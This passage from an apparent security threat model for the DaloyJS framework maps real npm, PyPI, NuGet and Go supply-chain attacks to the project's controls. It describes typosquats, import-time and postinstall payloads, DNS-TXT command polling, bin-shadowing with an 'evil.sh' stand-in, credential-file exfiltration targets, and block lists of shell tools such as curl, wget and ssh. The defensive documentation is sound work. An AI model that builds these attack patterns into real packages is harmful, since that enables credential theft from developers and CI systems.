| **Step 1 — Run code on a maintainer's machine** (`curl \| bash`, a poisoned `npm install` on a side project, a stale OS shim) | A compromised maintainer laptop **cannot publish on its own**: there is no long-lived `NPM_TOKEN` in repo secrets or on any developer machine. All publishes go through `release.yml` in the protected `npm-publish` GitHub Environment, which requires explicit approval from a second listed contact in [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md). Hardware-backed 2FA is mandatory on every maintainer's GitHub and npm account (§ Maintainer accounts), so even a stolen password does not unlock publish rights. |
| **Step 2 — `npm whoami --silent`** (discover the publish identity tied to the local `.npmrc`) | There is **no `.npmrc` with publish credentials** to discover. The framework explicitly forbids publishing from developer machines (§ Maintainer accounts); the only place `npm whoami` resolves to a publisher is inside the OIDC-minted, short-lived token issued to `release.yml` for the duration of a single publish job — and that token never touches a workstation. |
| **Step 3 — Download one of the user's packages to a temp folder** (clone the legitimate tarball as a base for the trojan) | Off-path for any in-repo control, but tag/version match is verified before `pnpm publish` runs (§ npm publishing). An attacker who reconstructs a tarball still has to push it through `release.yml`, which only accepts a signed `v*` tag pushed by a listed maintainer and pre-publish-verified by the `verify` job. |
| **Step 4 — Edit `package.json` to add a malicious `postinstall` hook and bump the version** | Two layers refuse this. (a) [`pnpm verify:no-lifecycle-scripts`](scripts/verify-no-lifecycle-scripts.ts) runs in both [`ci.yml`](.github/workflows/ci.yml) and the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml); it fails the build if *either* published manifest (`@daloyjs/core`, `create-daloy`) gains a `preinstall` / `install` / `postinstall` / `prepare` / `preprepare` / `postprepare` / `prepublish` hook. (b) `CODEOWNERS` ([`.github/CODEOWNERS`](.github/CODEOWNERS)) requires a maintainer to approve any change to `package.json`, the lockfile, or `.npmrc`. A direct push that adds a lifecycle hook would fail both the `verify` gate and review. |
| **Step 5 — `npm publish`** (the trojaned version goes live and propagates via semver ranges) | Publish happens **only** from `release.yml`, only after a signed tag, only with `--provenance`, and only after the protected `npm-publish` GitHub Environment grants approval. The actor on the publish run must be listed in the **Active** block of [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) or the release gate refuses. Every tarball is bound to its source commit via Sigstore + OIDC trusted publishing (§ npm publishing). |
| **Consumer-side auto-uptake** (downstream `pnpm install` pulls the trojan inside minutes via a caret range) | Two layers. (a) `minimum-release-age=1440` (24 h cooldown) in root [`.npmrc`](.npmrc) and every scaffolded template [`_npmrc`](packages/create-daloy/templates/node-basic/_npmrc) blocks install of a freshly published version inside the typical detect-and-unpublish window. (b) `ignore-scripts=true` in the same files suppresses every lifecycle hook even if a malicious version slips through — neutralising the Step-4 `postinstall` on the consumer side too. (c) Lockfile is committed and CI uses `pnpm install --frozen-lockfile` (`pnpm verify:lockfile` rejects any tarball URL outside `registry.npmjs.org`), so a fresh malicious version cannot enter a downstream tree silently on a re-install. |

What this **does not** defend against, and we say so explicitly:

- A maintainer who chooses to disable hardware 2FA, leak their session
  cookie, or run `npm publish` from a personal machine. The release
  workflow is the only sanctioned publish path; we cannot prevent a
  rogue maintainer from publishing a *different* (non-`@daloyjs/*`)
  package they happen to own from their laptop.
- A *consumer* application that opts out of the template defaults —
  removes `ignore-scripts=true` from its own `.npmrc`, sets
  `--minimum-release-age=0`, or installs a non-`@daloyjs/*` package
  outside the scope. Daloy ships safe defaults in every scaffolded
  template; we cannot police downstream projects that opt out.
- Compromise of the npm registry itself. Provenance attestations make
  it detectable after the fact; preventing it is npm's responsibility.

If a future incident report describes an attack step that any control in
the table above should have blocked, treat the gap as a release-blocking
bug and open a private advisory.

### Typosquat + init-time C2 (shopsprint pattern)

Socket's 2026-05-19 disclosure of
[`github.com/shopsprint/decimal`](https://socket.dev/blog/popular-go-decimal-library-typosquat-dns-backdoor)
is a Go-ecosystem incident, but the attack pattern is ecosystem-agnostic and
maps cleanly onto npm. We list it here because operators occasionally ask
which of our controls would actually have blocked it. The pattern has four
moving parts:

1. **Typosquat name** one character off the canonical package (`shopsprint`
   vs. `shopspring`), uploaded years before being weaponized.
2. **Trust-then-poison** release cadence — six years of benign mirror
   releases, then a malicious release seven minutes after a legitimate-looking
   bug-fix release on the same day.
3. **Init-time C2** — package init runs a background loop that polls a DNS
   TXT record on a free DDNS provider and executes any value as a command.
   No shell, no HTTP, no filesystem persistence.
4. **Registry-proxy persistence** — source repository and owner account
   deleted, but the module proxy continues serving the malicious tarball
   indefinitely from cache.

The npm-equivalent attack is a typosquat of a popular package that ships a
malicious `postinstall` (or an import-time side effect) and persists in the
npm registry tarball cache after the source repo is taken down. The
following Daloy controls are designed against exactly this pattern:

| Attack step | DaloyJS / template control |
| --- | --- |
| Typosquat replaces canonical dep in `package.json` | Lockfile is committed and CI runs `pnpm install --frozen-lockfile`; any unexplained dep change shows up in PR review. We also publish a stable scope (`@daloyjs/*`) so consumers can grep for the scope rather than trust unscoped autocomplete. |
| Trust-then-poison: malicious version published moments before install | `minimumReleaseAge: 1440` (24 h cooldown) in both the framework workspace ([`pnpm-workspace.yaml`](pnpm-workspace.yaml)) and every scaffolded project template ([`packages/create-daloy/templates/*/pnpm-workspace.yaml`](packages/create-daloy/templates)). Worm campaigns and trojan releases are typically detected and unpublished inside that window. |
| Init-time / postinstall payload runs on `pnpm install` | `ignore-scripts=true` in [`.npmrc`](.npmrc) (framework) and the template `_npmrc` (user apps) suppresses every lifecycle script. The pnpm 11 `strictDepBuilds: true` workspace key (framework only — deferred from templates because of transitive `esbuild`) hard-refuses installs of any package that needs a build. Packages permitted to build are listed explicitly in `pnpm.onlyBuiltDependencies` (`esbuild` only). |
| Import-time side effect runs the first time the app `import`s the dep | `@daloyjs/core` ships with **zero runtime dependencies** (enforced by [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) and the governance floor above), so importing `@daloyjs/core` cannot pull in a transitively trojanized package at all. User-installed deps still need handler-level review, but the framework adds zero new import-time attack surface. |
| Compromised release pulled from a non-registry source | `blockExoticSubdeps: true` (transitive deps refused unless they come from the configured registry) plus [`pnpm verify:lockfile`](scripts/verify-lockfile-sources.ts) (CI gate that rejects `git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…` URLs, and any tarball URL outside `registry.npmjs.org` — covering every npm-documented mutable git shorthand flagged by Socket's [Git dependency](https://socket.dev/npm/issue/gitDependency) and [HTTP dependency](https://socket.dev/npm/issue/httpDependency) critical alerts). |
| Source repo deleted, but malicious tarball still served from registry cache | Provenance attestation on every `@daloyjs/core` and `create-daloy` tarball (`--provenance` + Sigstore via OIDC, see § npm publishing) — consumers can verify the published bytes against the source commit and reject any release whose attestation cannot be re-derived from the GitHub source. |
| Operator pivots through any binary the dev or CI runs | Maintainer accounts require hardware-backed 2FA; the publish workflow uses no long-lived `NPM_TOKEN`, runs in a protected environment, and blocks egress to everything except npm, GitHub, and Sigstore via `step-security/harden-runner` (see § CI/CD). A compromised dev laptop cannot push a release on its own. |

What this **does not** defend against, and we say so explicitly:

- A user copying a typosquatted dep name into their own `package.json` by
  hand. No package manager can catch a human typo at the point of authoring.
  Mitigations are review, dependabot, and `pnpm why <name>` before merge.
- A second-stage payload that the operator pre-stages via a different vector
  and triggers later. The 24 h cooldown shortens the window but does not
  eliminate it.
- Compromise of the npm registry itself. Provenance attestations make this
  detectable after the fact; preventing it is npm's responsibility.

If a future incident report describes an attack step that any control in
the table above should have blocked, treat the gap as a release-blocking
bug and open a private advisory.

### Typosquat + module-init payload (IR.* NuGet 2026 pattern)

Socket's 2026-05-06 disclosure of the
[`bmrxntfj` NuGet typosquat campaign](https://socket.dev/blog/5-malicious-nuget-packages-impersonate-chinese-ui-libraries)
is a .NET-ecosystem incident, but the attack shape is ecosystem-agnostic and
maps cleanly onto npm. Five typosquatted packages (`IR.DantUI`,
`IR.Infrastructure.Core`, `IR.Infrastructure.DataService.Core`,
`IR.iplus32`, `IR.OscarUI`) impersonated private / internally distributed
Chinese .NET libraries and shipped a .NET Reactor-protected infostealer
that fired through the **module initializer** the moment the CLR loaded
any of the DLLs after `nuget restore` — no user interaction, no explicit
API call. The operator hid 219 historical versions as `listed: false`,
rotated the listed version on every analysis to invalidate file-hash
IOCs, and used a publish-burst sequence (Core packages first, consumers
second) consistent with a scripted release pipeline. Total exposure was
~65 000 downloads across approximately seven months.

The npm-equivalent attack is a typosquat of `@daloyjs/core` or
`create-daloy` (or a private-feed lookalike like `daloy-js`, `@daloy/core`,
`dalpyjs`) that ships either a malicious `postinstall` hook or an
import-time side effect in the entry-point module. The following Daloy
controls are designed against exactly this pattern:

| Attack step | DaloyJS / template control |
| --- | --- |
| Lookalike publisher account uploads typosquatted packages that impersonate a private / internal library | The canonical published identities are exactly **`@daloyjs/core`** and **`create-daloy`**, published from [`release.yml`](.github/workflows/release.yml) via npm Trusted Publishing (OIDC) by the `daloyjs` GitHub organisation. Every tarball is bound to its source commit via Sigstore provenance (`--provenance`), publicly verifiable on the npm package page and on the Rekor transparency log. Anything outside the `@daloyjs/*` scope or without a matching provenance attestation back to `daloyjs/daloy` on GitHub is **not** us — consumers and AI assistants should refuse to install it. |
| Typosquat replaces canonical dep in `package.json` | Lockfile is committed and CI runs `pnpm install --frozen-lockfile`; any unexplained dep change shows up in PR review. The stable `@daloyjs/*` scope means consumers can grep for the scope rather than trust unscoped autocomplete, and the scope is owned at the npm registry level so an attacker cannot publish `@daloyjs/anything-else` on a whim. |
| Hidden version rotation: 219 `listed: false` versions, only one listed at a time, rotated to invalidate file-hash IOCs | `minimum-release-age=1440` (24 h cooldown) in root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` refuses to install any version published less than a day ago — the rotation cadence the operator relies on to outrun analysis is exactly the window the cooldown closes. The pinned lockfile means a `pnpm install --frozen-lockfile` resolves to the exact version recorded in `pnpm-lock.yaml`, not whatever the operator listed five minutes ago. |
| Module initializer (`.NET module init` / npm `postinstall` / npm import-time side effect) fires the moment the package is restored or loaded | Two layers. (a) [`pnpm verify:no-lifecycle-scripts`](scripts/verify-no-lifecycle-scripts.ts) refuses to publish either `@daloyjs/core` or `create-daloy` if its `package.json` declares a `preinstall` / `install` / `postinstall` / `prepare` / `preprepare` / `postprepare` / `prepublish` hook, so the framework cannot become the carrier even after a maintainer-account compromise. (b) `ignore-scripts=true` in root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` suppresses every lifecycle hook on the *consumer* side too, so a typosquat that **does** declare a `postinstall` will not execute on a `pnpm install` inside a `create-daloy` project. |
| Import-time side effect inside the entry-point module (`index.js` runs the payload the first time the app imports it) | `@daloyjs/core` ships with **zero runtime dependencies** (enforced by [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) and the governance floor), so importing `@daloyjs/core` cannot pull in a transitively trojanized package at all. The framework's own source is forbidden from importing `child_process` / `vm`, calling bare `eval(...)`, constructing `new Function(...)` from a string, or dynamically importing a remote URL — enforced by [`pnpm verify:no-remote-exec`](scripts/verify-no-remote-exec.ts) in both [`ci.yml`](.github/workflows/ci.yml) and the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml), so the equivalent of the `clrjit.dll!getJit` patch has no primitive to land in `dist/`. |
| Reactor-style packed payload hidden inside an otherwise legitimate-looking decompile | `verify:no-invisible-unicode` and `verify:no-leaked-credentials` run on the assembled tarball **inside** the publish job after `pnpm build`, so a GlassWorm-class invisible-Unicode `eval()` carrier or a leaked-credentials drop inserted during install would still be caught before `pnpm publish`. The published tarball's `package.json#files` whitelist (`dist/` + `bin/` + `README.md` for core; `bin/` + `templates/` + `README.md` for the CLI) means npm never assembles a tarball containing files outside that list. |
| Compromised release pulled from a non-registry source (mirror, internal feed, GitHub artifact, Gitee tarball) | [`pnpm verify:lockfile`](scripts/verify-lockfile-sources.ts) (CI gate) rejects `git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…` URLs, and any tarball URL outside `registry.npmjs.org` in `pnpm-lock.yaml`. The scaffolded templates pin `registry=https://registry.npmjs.org/` in their `_npmrc` so a consumer project starts with the same posture. |
| Operator pivots through any binary the dev or CI runs after restore (`SharpInjector`, `clrjit.dll!getJit` JMP, RWX `VirtualAlloc`) | Out of the framework's control once an attacker has code execution on a workstation. Daloy's role is to keep the framework's *own* install path from becoming the carrier — the controls above shrink the chance of the framework being how a worm reaches a developer's machine. The Socket post's `dns-providersa2[.]com` / `47[.]100[.]60[.]237` IOCs and the `C:\ProgramData\Microsoft OneDrive\keys.dat` staging path are network and endpoint-layer concerns owned by the consumer's EDR / DNS-policy stack. |
| Operator account itself accumulates downloads while looking benign (`listed: false` history) | We do not publish lookalike packages to inflate trust. The canonical identities are the two named above. The release-author chain is cryptographically inspectable from the git log (signed commits, signed tags) and the actor on every publish run is verified against the **Active** block of [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) before `pnpm publish`. |

What this **does not** defend against, and we say so explicitly:

- A user copying a typosquatted package name (`daloy-js`, `@daloy/core`,
  `dalpyjs`, `daloyjs`) into their own `package.json` by hand. No package
  manager can catch a human typo at the point of authoring; mitigations are
  review, `pnpm why <name>` before merge, and pinning to the **exact**
  canonical identities listed above.
- A private NuGet-style internal feed inside the consumer's org that hosts
  a malicious lookalike of a *different* library the consumer depends on.
  The framework cannot police a downstream registry; consumers should
  scope-pin their internal feeds (`@yourcompany/*` only) and apply the
  same `ignore-scripts=true` + `minimum-release-age=1440` posture there.
- A compromised developer workstation already running the IR.* payload
  before `pnpm install @daloyjs/core` is run. Endpoint compromise is out
  of scope for any web-framework supply-chain control.

If a future incident report describes an attack step that any control in
the table above should have blocked, treat the gap as a release-blocking
bug and open a private advisory.

### Cross-platform postinstall binary drop (axios 2026 compromise pattern)

Snyk's 2026 disclosure of the
[axios npm package compromise](https://snyk.io/blog/axios-npm-package-compromised-supply-chain-attack-delivers-cross-platform/)
(see also Microsoft's
[mitigation guidance](https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/)
and Arctic Wolf's
[writeup](https://arcticwolf.com/resources/blog/supply-chain-attack-impacts-widely-used-axios-npm-package/))
is listed here because `axios` is one of the most-installed packages on
npm and the compromise touched a maintainer-account takeover, a
`postinstall` lifecycle script, and a cross-platform native payload — a
combination several earlier entries only partially cover. We map each
step explicitly so reviewers don't have to re-derive which Daloy control
catches it.

| Attack step | DaloyJS / template control |
| --- | --- |
| Maintainer account takeover (phishing / lapsed recovery email) used to publish trojaned `axios` versions | Upstream of any package-manager control. Our equivalent surface is every handle in [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) § Active: hardware-backed 2FA is mandatory at both the npm registry and the GitHub organization level (see § Maintainer accounts), the quarterly disclosure exercise re-verifies that each active contact's GitHub and npm recovery-email addresses still resolve to a domain the contact personally owns, and a lapsed-domain finding blocks the next publish. No long-lived `NPM_TOKEN` exists for an attacker to abuse; publishes use OIDC + Sigstore from `release.yml` only. |
| Trojaned version published moments before a downstream `pnpm install` | `minimum-release-age=1440` (24 h cooldown) in root [`.npmrc`](.npmrc) and every scaffolded template [`_npmrc`](packages/create-daloy/templates/node-basic/_npmrc) blocks install of a freshly published trojan version inside the typical detect-and-unpublish window. Every malicious `axios` release in this campaign was removed inside that window. |
| `postinstall` script (e.g. `prepare_node.js`) drops and executes a cross-platform Go binary that harvests npm/CI tokens, env vars, and wallets | `ignore-scripts=true` in root [`.npmrc`](.npmrc) and every template `_npmrc` suppresses *every* lifecycle hook (`preinstall` / `install` / `postinstall` / `prepare`). The allowlist for packages that legitimately need to build is `pnpm.onlyBuiltDependencies` in [`package.json`](package.json) (`esbuild` only on the framework; nothing on `@daloyjs/core` itself). The [`scripts/verify-no-lifecycle-scripts.ts`](scripts/verify-no-lifecycle-scripts.ts) governance gate (`pnpm verify:no-lifecycle-scripts`) refuses any PR that adds an install-time hook to a published manifest, so a future maintainer cannot quietly weaken this either. |
| `axios` pulled in transitively by an unrelated dependency, executing its `postinstall` on a consumer install of `@daloyjs/core` | `@daloyjs/core` ships **zero runtime dependencies** (enforced by [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) and the governance floor). Installing `@daloyjs/core` cannot pull in `axios` — or any other package — transitively. The framework's own HTTP/client code uses the platform `fetch` and Node `http`, never `axios`. |
| Trojaned binary phones home from the publish runner to attacker C2 | `step-security/harden-runner` on the publish workflow (see § CI/CD) blocks egress to anything outside the npm registry, GitHub, and the Sigstore endpoints needed for provenance. Even if a transitive dev-dep on the publish runner were trojaned in a future incident, the runner cannot reach attacker infrastructure. The same workflow runs in the protected `npm-publish` GitHub Environment with `persist-credentials: false`, so a stolen workflow token would expire before the next job step. |
| Consumer reinstalls and reintroduces the trojan after cleanup because the lockfile still pins the bad version | Scaffolded projects ship the same posture as the framework: `minimumReleaseAge: 1440` in [`packages/create-daloy/templates/*/pnpm-workspace.yaml`](packages/create-daloy/templates), `ignore-scripts=true` in each template `_npmrc`, and a lockfile that is committed and CI-checked with `pnpm install --frozen-lockfile`. Consumers can pin off a known-good version and rely on `pnpm verify:lockfile` ([`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts)) to reject any non-`registry.npmjs.org` tarball substitution. |

What this **does not** defend against, and we say so explicitly:

- A *consumer* application that depends on `axios` (directly or
  transitively) and disables the template defaults — e.g. removes
  `ignore-scripts=true` from its `.npmrc` or sets
  `--minimum-release-age=0`. Daloy ships safe defaults in every
  scaffolded template; we cannot police downstream projects that opt
  out of them.
- A future axios-style compromise that publishes a trojan version,
  remains undetected for **longer** than 24 h, and ships an
  import-time (not install-time) payload. `ignore-scripts=true` would
  not help against a pure `import`-time payload (see the `node-ipc`
  2026-05-14 table above); `minimum-release-age=1440` is what shortens
  that window, and the zero-runtime-deps posture is what keeps
  `@daloyjs/core` from carrying such a package at all.
- Compromise of the npm registry itself. Provenance attestations make
  it detectable after the fact; preventing it is npm's responsibility.

If a future incident report describes an attack step that any control in
the table above should have blocked, treat the gap as a release-blocking
bug and open a private advisory.

### Bin script confusion (Socket 2022-10-19 pattern)

Socket's [bin script confusion](https://socket.dev/blog/npm-bin-script-confusion)
write-up documents an attack class that is **not** blocked by
`--ignore-scripts`: a malicious or compromised npm package declares a
`bin` field whose key shadows a real shell command (most dangerously
`node` or `npm`, but also `npx`, `pnpm`, `yarn`, `bun`, `deno`, `tsc`,
`tsx`, `sh`, `bash`, `git`, `curl`, …). npm and pnpm symlink every
transitive `bin` into `node_modules/.bin/` and prepend that directory
to `$PATH` while running **any** npm script, so the next
`pnpm test` / `pnpm start` / `npm run build` silently invokes the
attacker's payload instead of the real binary. Lockfiles do not stop
this and `--ignore-scripts` has no bearing on `bin` symlinks (Socket
explicitly calls that out).

| Attack step | DaloyJS control |
| --- | --- |
| **Step 1 — A compromised or typosquatted dependency lands in the workspace declaring `bin: { "node": "evil.sh" }`** | [`pnpm verify:no-bin-shadowing`](scripts/verify-no-bin-shadowing.ts) walks the installed `node_modules/` tree (CI runs it after `pnpm install` in both [`ci.yml`](.github/workflows/ci.yml) and the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml)) and fails the build if any dependency declares a `bin` key matching a reserved system command (`node`, `npm`, `npx`, `pnpm`, `yarn`, `bun`, `deno`, `tsc`, `tsx`, `sh`, `bash`, `zsh`, `git`, `curl`, `wget`, `ssh`, `python`, …) unless the declaring package name is on the trusted-publisher allowlist (e.g. `tsc` is permitted only from `typescript`; `tsx` only from `tsx`). A typosquat publishing `bin: { "tsc": "evil.mjs" }` from a package named `typescriptt` is still rejected. |
| **Step 2 — A future maintainer quietly adds a malicious bin to a published Daloy manifest or template** | The same gate runs in publisher-allowlist mode against `@daloyjs/core`, `create-daloy`, and every `packages/create-daloy/templates/*/package.json`: only the literal bin names `daloy` and `create-daloy` are permitted on Daloy's own manifests. Any other key (whether or not it shadows a system command) fails the PR. Combined with `CODEOWNERS` review on `package.json`, this means a malicious bin cannot land via a sneaky diff. |
| **Step 3 — Race condition between two packages exporting the same bin (Socket's "non-deterministic bin script configurations" note)** | Because the allowlist is a `{ binName -> [packageName] }` mapping rather than a free pass for any package claiming a reserved name, even if two packages collide on `bin: { "tsc": ... }` only the entry coming from the genuine `typescript` package is accepted. Any other publisher claiming `tsc` triggers the gate regardless of which one pnpm resolves first. |
| **Step 4 — The attack relies on `--ignore-scripts` being insufficient** | Acknowledged in the gate's docstring and in this section: `ignore-scripts=true` in root [`.npmrc`](.npmrc) and every template `_npmrc` defends against `postinstall` worms but not bin shadowing. The bin-shadowing gate is the dedicated control for this class. |

What this **does not** defend against:

- A `bin` whose name is novel but still malicious (e.g.
  `bin: { "deploy": "evil.mjs" }`) — these don't shadow `$PATH` but
  could be invoked by an unwary developer. The gate flags this on Daloy's
  own manifests (the allowlist is `daloy` + `create-daloy`); on
  third-party deps it does not, because every CLI tool ships its own
  bins. Reviewers should still inspect any unfamiliar new `.bin/` entry
  before running `pnpm start` after a dependency update.
- A `bin` introduced by a dependency that is installed transiently
  between `pnpm install` and the next CI run on a developer's
  workstation. The gate runs in CI; running it locally (`pnpm verify:no-bin-shadowing`)
  before invoking any other npm script is the recommended defence.

### Import-time CJS payload + dormant-maintainer takeover (node-ipc 2026-05-14 reload)

Socket's 2026-05-14 disclosure of the
[`node-ipc` reload](https://socket.dev/blog/node-ipc-package-compromised)
(malicious versions `9.1.6`, `9.2.3`, `12.0.1`) is listed here because it
combines two attack characteristics that earlier entries did not. We map
them explicitly so reviewers don't have to re-derive which Daloy control
catches each step.

| Attack step | DaloyJS / template control |
| --- | --- |
| Malicious code appended as an IIFE to a **CJS** entrypoint (`node-ipc.cjs`) and executed at `require()` time — *not* via `postinstall`, `preinstall`, or `prepare` | `ignore-scripts=true` would **not** have helped here; `minimum-release-age=1440` (root `.npmrc` + every template `_npmrc`) is what blocks install of a freshly published trojan version inside the typical detect-and-unpublish window. All three malicious `node-ipc` versions were removed inside that window. |
| Transitive load of the poisoned CJS bundle through a seemingly unrelated dependency | `@daloyjs/core` ships **zero runtime dependencies** (enforced by [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) and the governance floor). Importing `@daloyjs/core` cannot pull in a transitive package at all, poisoned or otherwise. |
| Downstream consumer's `require()` chain re-entering a CJS variant of the framework | `@daloyjs/core` is **ESM-only** — `"type": "module"` in `package.json` and every entry in the `exports` field exposes only an `import` condition, no `require` condition. There is no CJS bundle of the framework that an attacker could append an IIFE to even if a future compromise tried. |
| Access vector: **dormant maintainer account** whose npm recovery-email domain had **lapsed and been re-registered** by the attacker, allowing a standard password reset to capture publish rights | This is upstream of any package-manager control — npm will honor a legitimate password reset to whatever address is on file. Our equivalent surface is every handle in [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) § Active. The quarterly disclosure exercise now explicitly verifies that each active contact's GitHub and npm recovery-email addresses still resolve to a domain the contact personally owns (or to a custodial provider the contact still has an active account with). A lapsed-domain finding blocks the next publish. |
| DNS-TXT exfiltration via a lookalike bootstrap resolver (`sh[.]azurestaticprovider[.]net`) during a CI/release run | `step-security/harden-runner` on the publish workflow blocks egress to anything outside the npm registry, GitHub, and the Sigstore endpoints. The framework cannot block runtime DNS exfiltration inside *consumer* applications — that is the operator's network-policy responsibility. |

What this **does not** defend against, and we say so explicitly:

- A consumer who chooses to `require()` a malicious CommonJS package in
  their own code. Daloy can keep itself ESM-only and dependency-free; it
  cannot police what the application loads.
- An attacker who compromises the recovery email of a Daloy maintainer
  *between* quarterly exercises. The exercise shortens the window; it
  does not eliminate it. Hardware-backed 2FA on the maintainer's GitHub
  and npm accounts remains the primary guard, and the
  `npm-publish` GitHub Environment still requires explicit approval
  from a second listed contact.

If a future incident report describes an attack step that any control in
either table above should have blocked, treat the gap as a release-blocking
bug and open a private advisory.

### Cross-ecosystem JS stealer delivered via PyPI + downloaded Bun runtime (Lightning 2026-04-30 / Shai-Hulud reload)

Snyk's 2026-04-30
[Lightning PyPI Compromise: A Bun-Based Credential Stealer in Python](https://snyk.io/blog/lightning-pypi-compromise-bun-based-credential-stealer/)
writeup (with companion analyses from
[StepSecurity](https://www.stepsecurity.io/blog/lightning-obfuscated-javascript-credential-stealer-bundled-in-pypi-wheel),
[The Hacker News](https://thehackernews.com/2026/04/pytorch-lightning-compromised-in-pypi.html),
and [JFrog's Shai-Hulud follow-up](https://research.jfrog.com/post/shai-hulud-here-we-go-again-may19/))
documents a new wrinkle on the supply-chain class that we should call out
explicitly even though `@daloyjs/core` ships on npm, not PyPI:

1. Two malicious releases of the popular [`lightning` PyPI package](https://pypi.org/project/lightning/)
   (2.6.2 and 2.6.3, the project formerly known as **pytorch-lightning**)
   ship a hidden `_runtime/` directory.
2. The package has **no `postinstall` hook**. The payload fires on the
   first `import lightning` instead — so `pip install`-time lifecycle
   suppression does not help; the moment the consumer's training script,
   notebook, or CI job actually imports the dep, the trojan runs.
3. The payload **downloads the Bun runtime** at execution time and uses
   Bun (not the system Python, not the system Node) to run an obfuscated
   ~11 MB JavaScript credential stealer (`router_runtime.js`). Using a
   freshly-downloaded alternative runtime is the new trick — it
   side-steps Python-side and Node-side static scanners that watch
   `import` graphs in those ecosystems, and the binary itself is not
   under the project's lockfile.
4. Snyk and JFrog tie this to the same threat actor as the
   **Shai-Hulud npm worm** (and its `@antv` May-19 reload): the campaign
   alternates between npm and PyPI to keep pivoting into compromised
   developer environments, and a successful credential exfiltration in
   either ecosystem feeds the next package compromise via stolen npm /
   PyPI / GitHub tokens.

DaloyJS is **a Node/TypeScript framework, not a Python package**, so we
cannot defend a consumer who `pip install lightning==2.6.2` into the same
container that also runs their Daloy app. But the *shape* of the attack —
"import-time payload + downloaded sidecar runtime + cross-ecosystem
credential pivot" — is one we have to map explicitly, because the same
shape can land on the npm side tomorrow (a malicious `@daloyjs/core`
look-alike that downloads Bun in its top-level module body, runs the
stealer outside Node, then opens a PR with the maintainer's exfiltrated
token).

| Attack step | DaloyJS / template control |
| --- | --- |
| Malicious release is published to the official registry and the developer / agent installs it within the first 24 hours | `minimum-release-age=1440` in this repo's [`.npmrc`](.npmrc) **and** in every scaffolded template's `_npmrc` ([`packages/create-daloy/templates/node-basic/_npmrc`](packages/create-daloy/templates/node-basic/_npmrc), `bun-basic`, `cloudflare-worker`, `vercel-edge`, etc.) refuses to resolve any npm version published less than 24 h ago. Lightning 2.6.2/2.6.3 were quarantined by PyPI well inside that window; the analogous npm cooldown would have stopped an `@daloyjs/core` look-alike from ever entering the install graph. *Caveat: pnpm's cooldown is npm-only — a Daloy consumer who also calls `pip install` inside the same project does not inherit it on the Python side.* |
| Payload fires at **import time** instead of at `postinstall` (the Lightning trick that defeats `--ignore-scripts`) | Two layers. **Tarball side**: `@daloyjs/core` has zero runtime dependencies ([`scripts/verify-no-runtime-deps.ts`](scripts/verify-no-runtime-deps.ts) gates every release) and [`src/index.ts`](src/index.ts) is **pure re-exports — no top-level side-effecting code** (no `fetch`, no `spawn`, no `Buffer.from(..., "base64")` blobs, no `eval`). A consumer's `import "@daloyjs/core"` executes no network or filesystem code. **Maintainer side**: the published tarball's `files` field is whitelisted to `dist/` + `README.md`; the unpacked layout would surface any unexpected `_runtime/` or vendored binary at publish review. The provenance attestation (Sigstore + OIDC, `release.yml`) binds the bytes to the source commit, so a Lightning-style swap on the registry cannot pass `npm install --provenance`-aware verification. |
| Payload **downloads an alternative runtime** (Bun) at execution time to dodge Python / Node static scanners | `step-security/harden-runner` on the publish workflow blocks egress from CI to anything other than the npm registry, GitHub, and Sigstore — a compromised dev dep on the maintainer's CI cannot pull a Bun binary at publish time. For *consumer* apps the framework cannot prevent a runtime download (Node's `fetch` + `child_process.spawn` are available to any handler that wants them), but the recommended posture in [`AGENTS.md`](AGENTS.md) and the docs is: run production behind a network policy that denies egress except to the listed provider endpoints, and prefer container images with no compiler / package-manager / shell so a runtime-downloaded binary has nothing to land on. `secureHeaders()` ships CSP nonce + Trusted Types so an in-process pivot through an admin dashboard is contained even if a downloaded runtime gets a foothold. |
| Compromised package source is a `git+ssh://` / `github:owner/repo#<sha>` / non-registry tarball URL pulled through a transitive dep to evade registry-side scanning | `blockExoticSubdeps: true` in [`pnpm-workspace.yaml`](pnpm-workspace.yaml) and every template's `pnpm-workspace.yaml` refuses to install exotic sub-deps. `pnpm verify:lockfile` ([`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts)) runs in [`ci.yml`](.github/workflows/ci.yml) and the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml); it rejects `git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…`, `http:` URLs and any tarball whose origin is not `registry.npmjs.org`. |
| Payload exfiltrates `~/.npmrc`, `~/.pypirc`, `~/.gitconfig`, `~/.aws/credentials`, `~/.ssh/`, GitHub tokens, and CI environment variables to a C2 endpoint | Daloy is a request/response framework — it does not read those files at runtime and does not store credentials. The relevant defense is **upstream**, in the maintainer's and consumer's CI: `step-security/harden-runner` is enabled on the publish workflow ([`release.yml`](.github/workflows/release.yml)) and recommended for consumer CI in the templates' `--with-ci` slice (tracked in [`otherdocs/template-supply-chain-hardening-plan.md`](otherdocs/template-supply-chain-hardening-plan.md)). The framework's own `release.yml` does not export long-lived tokens to disk (`persist-credentials: false` on `actions/checkout`, OIDC + provenance instead of `NPM_TOKEN`, granular npm tokens scoped per package), so even a successful payload on a *contributor's* machine cannot lift a publish-capable secret. |
